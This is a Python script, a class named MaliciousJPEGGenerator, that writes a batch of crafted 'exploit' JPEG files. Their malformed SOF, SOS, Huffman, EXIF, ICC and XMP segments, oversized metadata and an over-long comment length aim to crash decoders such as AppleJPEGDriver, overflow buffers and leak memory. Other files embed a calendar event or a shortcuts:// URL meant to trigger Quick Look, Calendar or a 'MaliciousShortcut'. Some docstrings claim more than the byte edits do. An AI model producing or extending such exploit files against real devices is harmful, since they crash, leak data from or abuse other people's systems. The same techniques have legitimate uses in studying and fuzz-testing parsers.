import os
import struct
from PIL import Image
from typing import Optional, List

class MaliciousJPEGGenerator:
    def __init__(self, output_dir: str = "malicious_jpegs"):
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
        self.base_image = Image.new('RGB', (64, 64), color='black')  # Minimal base image

    def _write_jpeg_segment(self, data: bytes, marker: int) -> bytes:
        """Helper to create a JPEG segment with given marker and data."""
        return struct.pack('>H', marker) + struct.pack('>H', len(data) + 2) + data

    def craft_illegal_submode(self, filename: str) -> None:
        """Generate JPEG with illegal decode/encode submode."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            f.seek(0)
            data = f.read()
            sof0_pos = data.find(b'\xFF\xC0')
            if sof0_pos != -1:
                f.seek(sof0_pos + 4)
                f.write(struct.pack('>H', 0xFFFF))
                print(f"Injected illegal submode at {filename}")

    def craft_invalid_dma(self, filename: str) -> None:
        """Generate JPEG with invalid DMA addresses in APPn segment."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            f.seek(2)
            app_data = struct.pack('>Q', 0xDEADBEEFDEADBEEF)
            app_segment = self._write_jpeg_segment(app_data, 0xFFE1)
            rest = f.read()
            f.seek(0)
            f.write(b'\xFF\xD8' + app_segment + rest)
            print(f"Injected invalid DMA address at {filename}")

    def craft_unsupported_format(self, filename: str) -> None:
        """Generate JPEG with unsupported pixel format."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            f.seek(0)
            data = f.read()
            sof0_pos = data.find(b'\xFF\xC0')
            if sof0_pos != -1:
                f.seek(sof0_pos + 7)
                f.write(struct.pack('>B', 0xFF))
                print(f"Injected unsupported pixel format at {filename}")

    def craft_illegal_dimensions(self, filename: str) -> None:
        """Generate JPEG with illegal scale factors and dimensions."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            f.seek(0)
            data = f.read()
            sof0_pos = data.find(b'\xFF\xC0')
            if sof0_pos != -1:
                f.seek(sof0_pos + 5)
                f.write(struct.pack('>HH', 0xFFFF, 0xFFFF))
                print(f"Injected illegal dimensions at {filename}")

    def craft_misaligned_stride(self, filename: str) -> None:
        """Generate JPEG with misaligned stride in APPn segment."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            f.seek(2)
            app_data = struct.pack('>I', 0x3)
            app_segment = self._write_jpeg_segment(app_data, 0xFFE1)
            rest = f.read()
            f.seek(0)
            f.write(b'\xFF\xD8' + app_segment + rest)
            print(f"Injected misaligned stride at {filename}")

    def craft_malicious_icc_profile(self, filename: str) -> None:
        """Generate JPEG with a malicious ICC color profile."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            f.seek(2)
            icc_data = b'ICC_PROFILE\x00' + b'\xFF' + b'\x00' * 1000
            app_segment = self._write_jpeg_segment(icc_data, 0xFFE2)
            rest = f.read()
            f.seek(0)
            f.write(b'\xFF\xD8' + app_segment + rest)
            print(f"Injected malicious ICC profile at {filename}")

    def craft_corrupted_exif(self, filename: str) -> None:
        """Generate JPEG with corrupted EXIF metadata."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            f.seek(2)
            exif_data = b'Exif\x00\x00' + b'MM\x00\x2A' + b'\xFF\xFF\xFF\xFF' + b'\x00' * 500
            app_segment = self._write_jpeg_segment(exif_data, 0xFFE1)
            rest = f.read()
            f.seek(0)
            f.write(b'\xFF\xD8' + app_segment + rest)
            print(f"Injected corrupted EXIF metadata at {filename}")

    def craft_malicious_xmp(self, filename: str) -> None:
        """Generate JPEG with malicious XMP metadata."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            f.seek(2)
            xmp_data = b'http://ns.adobe.com/xap/1.0/\x00' + b'<x:xmpmeta>' + b'\xFF' * 1000
            app_segment = self._write_jpeg_segment(xmp_data, 0xFFE1)
            rest = f.read()
            f.seek(0)
            f.write(b'\xFF\xD8' + app_segment + rest)
            print(f"Injected malicious XMP metadata at {filename}")

    def craft_corrupted_scan_data(self, filename: str) -> None:
        """Generate JPEG with corrupted scan data to cause decompression failures."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            data = f.read()
            sos_pos = data.find(b'\xFF\xDA')
            if sos_pos != -1:
                # Corrupt some bytes after the SOS marker
                f.seek(sos_pos + 10)
                f.write(b'\x00\xFF\x00\xFF' + b'\x00' * 100)
                print(f"Injected corrupted scan data at {filename}")

    def craft_malformed_huffman_tables(self, filename: str) -> None:
        """Generate JPEG with malformed Huffman tables to crash the decoder."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            data = f.read()
            dht_pos = data.find(b'\xFF\xC4')
            if dht_pos != -1:
                f.seek(dht_pos + 4)
                f.write(b'\xFF' * 16 + b'\x00' * 100)
                print(f"Injected malformed Huffman tables at {filename}")

    def craft_oversized_metadata(self, filename: str) -> None:
        """Generate JPEG with oversized metadata to trigger buffer overflows."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            f.seek(2)
            exif_data = b'Exif\x00\x00' + b'MM\x00\x2A' + b'\x00\x00\x00\x08' + b'\xFF' * 65519
            app_segment = self._write_jpeg_segment(exif_data, 0xFFE1)
            rest = f.read()
            f.seek(0)
            f.write(b'\xFF\xD8' + app_segment + rest)
            print(f"Injected oversized metadata at {filename}")

    def craft_invalid_sos_segment(self, filename: str) -> None:
        """Generate JPEG with invalid SOS segment to crash AppleJPEGDriver."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            data = f.read()
            sos_pos = data.find(b'\xFF\xDA')
            if sos_pos != -1:
                f.seek(sos_pos + 2)
                f.write(struct.pack('>H', 0x0006) + b'\xFF' + b'\x00\x00' * 2)
                print(f"Injected invalid SOS segment at {filename}")

    def craft_info_leak_via_length(self, filename: str) -> None:
        """
        Generate JPEG with a COM segment length far exceeding its actual data
        to trigger an out-of-bounds read (information leak).
        """
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", "r+b") as f:
            f.seek(2)
            original_data = f.read()
            marker = b'\xFF\xFE'
            length = struct.pack('>H', 4096) 
            actual_data = b'A' * 16
            malicious_segment = marker + length + actual_data
            f.seek(0)
            f.write(b'\xFF\xD8' + malicious_segment + original_data)
            print(f"Crafted info leak JPEG at {filename}")
			
    def craft_quicklook_trigger(self, filename: str) -> None:
        """Generate JPEG with malformed EXIF thumbnail to trigger Quick Look overlay."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            f.seek(2)
            thumbnail_data = b'\xFF\xD8' + b'\xFF' * 100 + b'\x00' * 500
            exif_data = (
                b'Exif\x00\x00' + b'MM\x00\x2A' +
                b'\x00\x00\x00\x08' + b'\x00\x02' +
                b'\x02\x01' + b'\x00\x04' + b'\x00\x00\x00\x01' + struct.pack('>I', 0x00000020) +
                b'\x02\x02' + b'\x00\x04' + b'\x00\x00\x00\x01' + struct.pack('>I', len(thumbnail_data)) +
                b'\x00\x00' + thumbnail_data
            )
            app_segment = self._write_jpeg_segment(exif_data, 0xFFE1)
            rest = f.read()
            f.seek(0)
            f.write(b'\xFF\xD8' + app_segment + rest)
            print(f"Injected malformed EXIF thumbnail to trigger Quick Look at {filename}")

    def craft_calendar_trigger(self, filename: str) -> None:
        """Generate JPEG with metadata to trigger the Calendar app."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            f.seek(2)
            exif_data = (
                b'Exif\x00\x00' + b'MM\x00\x2A' +
                b'\x00\x00\x00\x08' + b'\x00\x01' +
                b'\x01\x32' + b'\x00\x02' + b'\x00\x00\x00\x14' + struct.pack('>I', 0x00000020) +
                b'\x00\x00' + b'2025:04:25 12:00:00\x00'
            )
            exif_segment = self._write_jpeg_segment(exif_data, 0xFFE1)
            ical_data = (
                b'BEGIN:VCALENDAR\n' + b'VERSION:2.0\n' +
                b'BEGIN:VEVENT\n' + b'SUMMARY:Malicious Event\n' +
                b'DTSTART:20250425T120000\n' + b'DTEND:20250425T130000\n' +
                b'END:VEVENT\n' + b'END:VCALENDAR\n'
            )
            xmp_data = (
                b'http://ns.adobe.com/xap/1.0/\x00' +
                b'<x:xmpmeta xmlns:x="adobe:ns:meta/">' +
                b'<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">' +
                b'<rdf:Description rdf:about="" xmlns:dc="http://purl.org/dc/elements/1.1/">' +
                f'<dc:description>{ical_data.decode()}</dc:description>'.encode() +
                b'</rdf:Description></rdf:RDF></x:xmpmeta>'
            )
            xmp_segment = self._write_jpeg_segment(xmp_data, 0xFFE1)
            rest = f.read()
            f.seek(0)
            f.write(b'\xFF\xD8' + exif_segment + xmp_segment + rest)
            print(f"Injected calendar trigger metadata at {filename}")

    def craft_shortcut_trigger(self, filename: str) -> None:
        """Generate JPEG with metadata to trigger a Shortcut."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            f.seek(2)
            shortcut_url = b'shortcuts://run-shortcut?name=MaliciousShortcut'
            xmp_data = (
                b'http://ns.adobe.com/xap/1.0/\x00' +
                b'<x:xmpmeta xmlns:x="adobe:ns:meta/">' +
                b'<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">' +
                b'<rdf:Description rdf:about="" xmlns:dc="http://purl.org/dc/elements/1.1/">' +
                f'<dc:description>{shortcut_url.decode()}</dc:description>'.encode() +
                b'</rdf:Description></rdf:RDF></x:xmpmeta>'
            )
            app_segment = self._write_jpeg_segment(xmp_data, 0xFFE1)
            rest = f.read()
            f.seek(0)
            f.write(b'\xFF\xD8' + app_segment + rest)
            print(f"Injected Shortcut trigger metadata (URL: {shortcut_url.decode()}) at {filename}")

    def generate_all(self, prefix: str = "exploit") -> List[str]:
        """Generate JPEGs for all vulnerabilities."""
        files = []
        vulnerability_functions = [
            self.craft_illegal_submode,
            self.craft_invalid_dma,
            self.craft_unsupported_format,
            self.craft_illegal_dimensions,
            self.craft_misaligned_stride,
            self.craft_malicious_icc_profile,
            self.craft_corrupted_exif,
            self.craft_malicious_xmp,
            self.craft_corrupted_scan_data,
            self.craft_malformed_huffman_tables,
            self.craft_oversized_metadata,
            self.craft_invalid_sos_segment,
            self.craft_quicklook_trigger,
            self.craft_calendar_trigger,
            self.craft_shortcut_trigger,
            self.craft_info_leak_via_length
        ]
        
        for i, func in enumerate(vulnerability_functions):
            filename = f"{prefix}_{i}.jpg"
            func(filename)
            files.append(filename)
        return files

def main():
    generator = MaliciousJPEGGenerator()
    files = generator.generate_all()
    print(f"\nGenerated {len(files)} JPEGs: {', '.join(files)}")
    print(f"Files saved in ./{generator.output_dir}/")

if __name__ == "__main__":
    main()
